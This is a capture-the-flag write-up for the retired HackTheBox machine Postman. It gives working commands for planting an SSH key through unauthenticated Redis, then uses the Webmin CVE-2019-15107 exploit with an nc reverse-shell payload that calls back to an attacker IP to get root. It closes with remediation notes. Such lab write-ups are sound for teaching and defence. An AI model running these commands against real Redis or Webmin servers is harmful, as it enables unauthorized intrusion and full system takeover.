HTB Postman: unauthenticated Redis to SSH, Webmin RCE to root

retired-machineeasy

Postman is a retired HackTheBox easy Linux machine teaching two service-hardening lessons back to back. Synopsis: Redis with no password becomes an SSH key drop, then Webmin 1.910 password-reset RCE (CVE-2019-15107) finishes as root.

$ Enumeration — two services, two roads

# nmap: spot Redis plus Webmin
nmap -sC -sV -oN postman.nmap 10.10.10.160   # 6379 redis, 22 ssh, 10000 webmin 1.910

Redis on 6379, SSH, and Webmin 1.910 on port 10000. Probe Redis auth first — an unauthenticated database is the fastest foothold on the box.

$ Foothold — Redis key drop (no CVE needed)

# bash: write your key via Redis
ssh-keygen -t rsa -f postman_key -N ""
redis-cli -h 10.10.10.160
10.10.10.160:6379> CONFIG SET dir /var/lib/redis/.ssh
10.10.10.160:6379> CONFIG SET dbfilename authorized_keys
10.10.10.160:6379> SET crackit "\n\nssh-rsa AAAAB3...you@box\n\n"
10.10.10.160:6379> SAVE
ssh -i postman_key redis@10.10.10.160

Redis lets clients set its directory and dump file — point them at an authorized_keys path, SAVE, and SSH in. No exploit code: just a database doing exactly what it was told.

$ Privilege escalation — Webmin CVE-2019-15107

# bash: password-reset RCE to root
# Webmin 1.910 password_change.cgi RCE (public exploit):
python3 webmin-15107.py https://10.10.10.160:10000 "id; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 4445 >/tmp/f"
nc -lvnp 4445   # uid=0(root)

The password-change endpoint executes commands and Webmin runs privileged — RCE equals root directly. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Redis command-execution modules first (the key-drop is simpler and quieter — master the primitive) and SSH password guessing (the key path bypasses passwords entirely).

$ Remediation notes

Bind Redis to localhost with requirepass, never expose it, patch Webmin past 1.910, and treat unauthenticated database ports as critical. Written by Lucky Thandel.
